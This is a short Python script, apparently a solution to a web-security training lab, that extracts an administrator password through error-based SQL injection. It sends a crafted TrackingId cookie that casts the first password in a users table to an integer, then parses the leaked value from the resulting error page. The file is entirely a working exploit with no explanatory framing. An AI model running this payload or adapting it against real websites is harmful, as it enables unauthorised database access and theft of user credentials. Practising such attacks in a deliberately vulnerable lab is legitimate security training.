import sys
import requests
from bs4 import BeautifulSoup
def main():
    try:
        url = sys.argv[1].rstrip('/')
        payload = "' AND 1=CAST((SELECT password FROM users LIMIT 1) AS int)--"
        response = requests.get(url, cookies={"TrackingId": payload})

        #Extracting password from response
        soup = BeautifulSoup(response.text, 'html.parser')
        password = soup.find('p', class_='is-warning').text.split('"')[1]
        print(f"Administrator account password: {password}")

    except IndexError:
        print(f"Usage: python3 {sys.argv[0]} <url> \nExample: python3 {sys.argv[0]} https://0a54001c03544eff826c97940016002a.web-security-academy.net")

if __name__ == "__main__":
        main()